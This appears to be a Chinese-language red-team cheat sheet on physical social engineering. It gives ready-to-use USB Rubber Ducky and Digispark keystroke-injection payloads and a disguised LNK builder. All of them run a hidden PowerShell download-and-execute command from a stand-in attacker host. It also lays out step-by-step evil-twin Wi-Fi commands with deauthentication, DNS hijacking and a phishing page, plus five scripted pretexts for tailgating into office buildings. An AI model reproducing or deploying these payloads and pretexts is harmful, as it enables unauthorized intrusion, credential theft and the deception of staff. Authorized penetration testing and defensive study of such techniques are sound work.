# 物理社工与 USB 投放

## USB 投放（Rubber Ducky / HID 伪装）

### USB Rubber Ducky 脚本
```
REM USB Rubber Ducky — 凭据窃取
REM 延迟等待设备识别
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
ENTER
DELAY 500
```

### 自定义 HID (Arduino/Digispark)

```cpp
// Digispark (ATtiny85) — 伪装键盘
#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.sendKeyStroke(0);
    delay(500);

    // Win+R
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    delay(500);

    // 输入 PowerShell 下载执行
    DigiKeyboard.print("powershell -w h -ep b -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1'))\"");

    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
```

### LNK 文件投放

```python
import os
import shutil

def create_lnk(target_path, icon_path, payload_cmd):
    """
    创建伪装 LNK 快捷方式
    target_path: 保存路径
    icon_path: 图标文件路径（伪装成文件夹/文档）
    payload_cmd: 实际执行的命令
    """
    # 使用 pythoncom 或 PyLink
    try:
        import pythoncom
        from win32com.shell import shell, shellcon

        shortcut = pythoncom.CoCreateInstance(
            shellcon.CLSID_ShellLink,
            None,
            pythoncom.CLSCTX_INPROC_SERVER,
            shellcon.IID_IShellLink
        )
        shortcut.SetPath(payload_cmd.split()[0])
        shortcut.SetArguments(" ".join(payload_cmd.split()[1:]))
        shortcut.SetIconLocation(icon_path, 0)

        persist = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
        persist.Save(target_path, False)

        print(f"[+] LNK created: {target_path}")
    except ImportError:
        print("[!] 需要 pywin32: pip install pywin32")

# 使用方法
# create_lnk("Documents.lnk", "shell32.dll,4",
#            "powershell -w h -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')")
```

## Wi-Fi Evil Twin

```bash
# airgeddon 或手动

# 1. 开启监听模式
airmon-ng start wlan0
# wlan0mon

# 2. 扫描目标 AP
airodump-ng wlan0mon

# 3. 创建 Evil Twin
# 克隆目标 SSID 和 BSSID
# 用 hostapd 创建伪造 AP

cat > evil_twin.conf << 'EOF'
interface=wlan0mon
ssid=TARGET_WIFI
bssid=AA:BB:CC:DD:EE:FF
channel=6
hw_mode=g
auth_algs=1
ignore_broadcast_ssid=0
EOF

hostapd evil_twin.conf &

# 4. 去认证原 AP
aireplay-ng --deauth 100 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. 配置 DNS 劫持
# dnsmasq
cat > dns.conf << 'EOF'
interface=wlan0mon
dhcp-range=192.168.50.10,192.168.50.100,12h
address=/#/192.168.50.1
EOF

dnsmasq -C dns.conf &

# 6. 启动钓鱼页面
python3 -m http.server 80
# 或部署钓鱼登录页
```

## 门禁尾随话术

```
场景：尾随进入办公楼

话术 1（外卖）：
"你好，我是 XX 外卖的，有个订单送到 12 楼，
门禁卡在楼下电梯里，能不能帮忙刷一下？送到就下来"

话术 2（快递）：
"您好，C 区 305 的快递，但门禁卡忘带了，
能帮忙开一下门吗？东西很重"

话术 3（新员工）：
"我是今天新来的，人事说 8 楼报到，
但还没发门禁卡，能带我上去吗？"

话术 4（访客）：
"我约了张总 10 点，他说到了在前台等，
但前台没人，能帮忙刷一下吗？"

话术 5（忘带卡）：
"完了，今天换了个包，门禁卡落在旧包里了，
我是 9 楼的，能不能帮忙刷一下？"
```

## 物理设备植入

### LAN Turtle / Bash Bunny
```bash
# Bash Bunny — 伪装 USB 以太网适配器
# 自动执行：从目标机器窃取凭据

# payload.txt (Bash Bunny)
LED R 100  # 红灯，开始
ATTACKMODE ECM_STORAGE
sleep 2
# 挂载存储，执行 payload
LED G  # 绿灯，完成
```

### 网络植入（Pineapple）
```bash
# WiFi Pineapple — 持续 Wi-Fi 中间人
# 自动 Karma（响应所有探测请求）
# DNS 劫持 + 钓鱼落地页
```
